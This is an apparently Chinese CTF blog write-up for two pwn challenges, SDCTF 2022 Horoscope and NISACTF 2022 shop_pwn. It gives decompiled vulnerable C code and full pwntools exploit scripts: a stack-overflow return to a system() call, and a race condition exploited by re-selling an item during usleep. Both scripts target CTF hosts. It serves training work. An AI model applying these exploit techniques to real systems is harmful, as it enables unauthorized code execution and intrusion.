<h2 id="11-11"><a href="#11-11" class="headerlink" title="11.11"></a>11.11</h2><h3 id="SDCTF-2022-Horoscope"><a href="#SDCTF-2022-Horoscope" class="headerlink" title="[SDCTF 2022]Horoscope"></a>[SDCTF 2022]Horoscope</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to SDCTF&#x27;s very own text based horoscope&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please put in your birthday and time in the format (month/day/year/time) and we will have your very own horoscope&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">320</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  processInput(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">processInput</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *nptr; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  nptr = strtok(a1, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      v4 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">3</span> )</span><br><span class="line">      atoi(nptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;January&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;February&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;March&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;April&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;May&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;June&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;July&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;August&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;September&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;October&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;November&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wow, you were born in the month of %s. I think that means you will have a great week! :)&quot;</span>, <span class="string">&quot;December&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;thats not a valid date &gt;:-(&quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显的栈溢出让程序正常执行下去所以要有1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">28993</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">system_addr = <span class="number">0x40095F</span></span><br><span class="line">offset = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;1&#x27;</span>+cyclic(offset-<span class="number">1</span>),system_addr])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="NISACTF-2022-shop-pwn"><a href="#NISACTF-2022-shop-pwn" class="headerlink" title="[NISACTF 2022]shop_pwn"></a>[NISACTF 2022]shop_pwn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;     Welcome to my shop     &quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;+===========================+&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;| No|        | Sell| Recycle|&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;+===+========+=====+========+&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)&amp;gd[<span class="number">24</span> * i + <span class="number">16</span>] )</span><br><span class="line">          <span class="built_in">printf</span>(</span><br><span class="line">            <span class="string">&quot;| %d | %-4s   | %3d |   %3d  |\n&quot;</span>,</span><br><span class="line">            i,</span><br><span class="line">            &amp;gd[<span class="number">24</span> * i],</span><br><span class="line">            *(_DWORD *)&amp;gd[<span class="number">24</span> * i + <span class="number">16</span>],</span><br><span class="line">            *(_DWORD *)&amp;gd[<span class="number">24</span> * i + <span class="number">20</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;+===========================+&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. look bags\n2. buy goods\n3. sale goods&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      v0 = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      buy();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sale();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      look();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sale</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which one?\n&gt; &quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( bags[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    pthread_create(&amp;newthread, <span class="number">0LL</span>, to_sale, (<span class="type">void</span> *)v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Fair prices!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;R U kidding me?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which one?\n&gt; &quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> || v1 == <span class="number">2</span> || v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)&amp;gd[<span class="number">24</span> * v1 + <span class="number">16</span>] &lt;= money )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        money -= *(_DWORD *)&amp;gd[<span class="number">88</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;God bless you&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        pthread_create(&amp;newthread, <span class="number">0LL</span>, to_buy, (<span class="type">void</span> *)v1);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Thank you for your patronage~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Poor bastard!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">to_sale</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = bags[(<span class="type">int</span>)a1];</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    money += dword_60214C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Oops???&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    money += dword_602164;</span><br><span class="line">  &#125;</span><br><span class="line">  usleep(<span class="number">0xC350</span>u);</span><br><span class="line">  result = (<span class="type">void</span> *)(<span class="type">int</span>)a1;</span><br><span class="line">  bags[(<span class="type">int</span>)a1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以在usleep的时候再次卖出物品</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">23234</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

